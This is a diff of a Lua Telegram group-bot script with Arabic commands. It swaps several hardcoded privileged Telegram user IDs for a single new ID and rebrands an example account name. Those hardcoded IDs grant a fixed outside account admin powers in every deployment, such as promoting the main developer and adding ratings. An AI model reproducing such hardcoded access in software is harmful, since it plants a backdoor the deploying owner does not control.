-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) or tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
 if UserInfo.message == "Invalid user ID" then
@@ -16766,7 +16766,7 @@ return send(msg_chat_id,msg_id,'\n*⇜ مـايمـديك .. هـذا الامـ
 end
 end
 if text and text:match("^اضف خمس نجمات (%d+)$") then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:incrby(Zelzal..'Zilzal:Takeem:T5', text:match("^اضف خمس نجمات (%d+)$"))  
 return send(msg_chat_id,msg_id,"*⇜ تم اضافه عـدد* { "..text:match("^اضف خمس نجمات (%d+)$").." } *تقييـم خمس نجمـات ⭐*","md",true)  
 else
@@ -16774,7 +16774,7 @@ return send(msg_chat_id,msg_id,'\n*⇜ مـايمـديك .. هـذا الامـ
 end
 end
 if text and text:match("^اضف اربع نجمات (%d+)$") then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:incrby(Zelzal..'Zilzal:Takeem:T4', text:match("^اضف اربع نجمات (%d+)$"))  
 return send(msg_chat_id,msg_id,"*⇜ تم اضافه عـدد* { "..text:match("^اضف اربع نجمات (%d+)$").." } *تقييـم اربع نجمـات ⭐*","md",true)  
 else
@@ -16782,7 +16782,7 @@ return send(msg_chat_id,msg_id,'\n*⇜ مـايمـديك .. هـذا الامـ
 end
 end
 if text and text:match("^اضف ثلاث نجمات (%d+)$") then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:incrby(Zelzal..'Zilzal:Takeem:T3', text:match("^اضف ثلاث نجمات (%d+)$"))  
 return send(msg_chat_id,msg_id,"*⇜ تم اضافه عـدد* { "..text:match("^اضف ثلاث نجمات (%d+)$").." } *تقييـم ثلاث نجمـات ⭐*","md",true)  
 else
@@ -16790,7 +16790,7 @@ return send(msg_chat_id,msg_id,'\n*⇜ مـايمـديك .. هـذا الامـ
 end
 end
 if text and text:match("^اضف نجمتين (%d+)$") then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:incrby(Zelzal..'Zilzal:Takeem:T2', text:match("^اضف نجمتين (%d+)$"))  
 return send(msg_chat_id,msg_id,"*⇜ تم اضافه عـدد* { "..text:match("^اضف نجمتين (%d+)$").." } *تقييـم نجمتيـن ⭐*","md",true)  
 else
@@ -16798,7 +16798,7 @@ return send(msg_chat_id,msg_id,'\n*⇜ مـايمـديك .. هـذا الامـ
 end
 end
 if text and text:match("^اضف نجمه (%d+)$") then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:incrby(Zelzal..'Zilzal:Takeem:T1', text:match("^اضف نجمه (%d+)$"))  
 return send(msg_chat_id,msg_id,"*⇜ تم اضافه عـدد* { "..text:match("^اضف نجمه (%d+)$").." } *تقييـم نجمـه ⭐*","md",true)  
 else
@@ -17725,7 +17725,7 @@ end
 if text == "ترند القروبات" or text == "ترند المجموعات" then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -19222,7 +19222,7 @@ if not msg.ControllerBot then
 return send(msg_chat_id,msg_id,'\n*⇜ هـذا الامـر يخـص* ( '..Controller_Num(1)..' ) ',"md",true)  
 end
 Redis:setex(Zelzal.."Zelzal:Add:Thift:Bot"..msg.sender_id.user_id,300,true) 
-return send(msg_chat_id,msg_id,"*⇜ ارسل لي اسم حسابك الان 🪪*\n\n*⇜ مثـال :*\n*⇜ اذا كان اسم حسابك هو 𝖹Ꭵᥣᴢᥲ️ᥣ </>*\n*⇜ ارسل لي الاسم هكذا فقط 𝖹Ꭵᥣᴢᥲ️ᥣ*\n*⇜ بدون رموز الاسم الاساسي فقط 🥷*","md",true)  
+return send(msg_chat_id,msg_id,"*⇜ ارسل لي اسم حسابك الان 🪪*\n\n*⇜ مثـال :*\n*⇜ اذا كان اسم حسابك هو BiLaL </>*\n*⇜ ارسل لي الاسم هكذا فقط BiLaL*\n*⇜ بدون رموز الاسم الاساسي فقط 🥷*","md",true)  
 end
 if text == '✦ تعطيل كاشف الانتحال ✦' or text == 'تعطيل مانع الانتحال' then 
 if not msg.ControllerBot then 
@@ -19875,7 +19875,7 @@ end
 if text == ('✦ رفع مطور اساسي ✦') and msg.reply_to_message_id == 0 then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -19888,7 +19888,7 @@ end
 if text == ('✦ تنزيل مطور اساسي ✦') and msg.reply_to_message_id == 0 then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
